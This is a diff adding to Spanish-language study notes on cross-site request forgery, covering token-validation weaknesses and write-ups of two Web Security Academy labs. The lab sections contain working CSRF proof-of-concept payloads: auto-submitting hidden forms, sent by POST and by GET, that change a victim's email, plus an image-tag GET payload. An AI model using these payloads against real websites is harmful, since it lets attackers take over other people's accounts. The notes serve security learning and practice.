@@ -29,3 +29,45 @@ Por ejemplo:
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 
 ```
+
+Algunas ocaciones la aplicacion valida el TOKEN cuando se hace una peticion POST pero ***NO valida cuando se realiza una peticion GET***
+Otras ocaciones la aplicaciones permiten hacer cosas sin el token asi que hay que probar.
+Tambien otra vulnerabilidad es que la app usa un pool de tokens entonces tu podrias crearte un usuario obtener un token valido e intentar usarlo para otros usuarios.
+Otro vector de ataque es que se asigna un token en base a la cookie.
+
+> This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
+
+# Labs
+
+##  CSRF vulnerability with no defenses
+
+Para este lab no se tiene defensas entonces con que la victima de click en un codigo como este:
+
+```
+
+<form method="POST" action="https://0a0d00b604a855c2c086536600b800d8.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="a1&#64;test&#46;com">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+```
+
+Se estaria cambiando su email.
+
+## CSRF where token validation depends on request method
+
+Para este ejemplo si cuenta la app con proteccion pero solo para el metodo post pero si lo intentas por el metodo GET si cambia el email aqui el ejemplo
+
+```
+<form method="GET" action="https://0a1f006e03d8dd12c0fe542800c400ba.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="a1&#64;test&#46;com">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+```
+NOTA: Se puede utilizar la herramienta "csrf-poc-generator-master" para generar un poc de una peticion genera un script parecido.
+
